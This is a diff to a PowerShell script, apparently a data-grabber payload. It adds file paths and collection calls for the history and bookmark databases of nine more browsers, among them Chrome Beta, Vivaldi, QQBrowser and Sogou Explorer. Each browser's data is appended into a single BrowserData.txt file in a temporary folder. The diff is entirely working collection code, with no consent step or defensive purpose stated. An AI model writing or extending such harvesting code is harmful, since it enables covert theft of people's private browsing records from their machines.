@@ -549,6 +549,22 @@ function Get-BrowserData {
     elseif ($Browser -eq 'yandex'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata/../Local/Yandex/YandexBrowser/User Data/Default/Bookmarks"}
     elseif ($Browser -eq 'brave'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata/../Local/BraveSoftware/Brave-Browser/User Data/Default/History"}
     elseif ($Browser -eq 'brave'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata/../Local/BraveSoftware/Brave-Browser/User Data/Default/Bookmarks"}
+	elseif ($Browser -eq 'chromebeta'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome Beta\User Data\Default\History"}
+    elseif ($Browser -eq 'chromebeta'    -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome Beta\User Data\Default\Bookmarks"}
+	elseif ($Browser -eq 'chromium'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata\..\Local\Chromium\User Data\Default\History"}
+    elseif ($Browser -eq 'chromium'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata\..\Local\Chromium\User Data\Default\Bookmarks"}
+	elseif ($Browser -eq '360chrome'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata\..\Local\360chrome\Chrome\User Data\Default\History"}
+    elseif ($Browser -eq '360chrome'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata\..\Local\360chrome\Chrome\User Data\Default\Bookmarks"}
+	elseif ($Browser -eq 'qqbrowser'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata\..\Local\Tencent\QQBrowser\User Data\Default\History"}
+    elseif ($Browser -eq 'qqbrowser'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata\..\Local\Tencent\QQBrowser\User Data\Default\Bookmarks"}
+	elseif ($Browser -eq 'vivaldi'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata\..\Local\Vivaldi\User Data\Default\History"}
+    elseif ($Browser -eq 'vivaldi'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata\..\Local\Vivaldi\User Data\Default\Bookmarks"}
+	elseif ($Browser -eq 'coccoc'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata\..\Local\CocCoc\Browser\User Data\Default\History"}
+    elseif ($Browser -eq 'coccoc'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata\..\Local\CocCoc\Browser\User Data\Default\Bookmarks"}
+	elseif ($Browser -eq 'dcbrowser'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata\..\Local\DCBrowser\User Data\Default\History"}
+    elseif ($Browser -eq 'dcbrowser'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata\..\Local\DCBrowser\User Data\Default\Bookmarks"}
+	elseif ($Browser -eq 'sogouexplorer'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata\..\Local\SogouExplorer\Webkit\Default\History"}
+    elseif ($Browser -eq 'sogouexplorer'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata\..\Local\SogouExplorer\Webkit\Default\Bookmarks"}
     elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
     
 
@@ -575,6 +591,30 @@ Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\Br
 
 Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
 Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+
+Get-BrowserData -Browser "chromebeta" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "chromebeta" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+
+Get-BrowserData -Browser "chromium" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "chromium" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+
+Get-BrowserData -Browser "360chrome" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "360chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+
+Get-BrowserData -Browser "qqbrowser" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "qqbrowser" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+
+Get-BrowserData -Browser "vivaldi" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "vivaldi" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+
+Get-BrowserData -Browser "coccoc" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "coccoc" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+
+Get-BrowserData -Browser "dcbrowser" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "dcbrowser" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
+
+Get-BrowserData -Browser "sogouexplorer" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
+Get-BrowserData -Browser "sogouexplorer" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
 
 Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\$FolderName\BrowserData.txt
 Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\$FolderName\BrowserData.txt
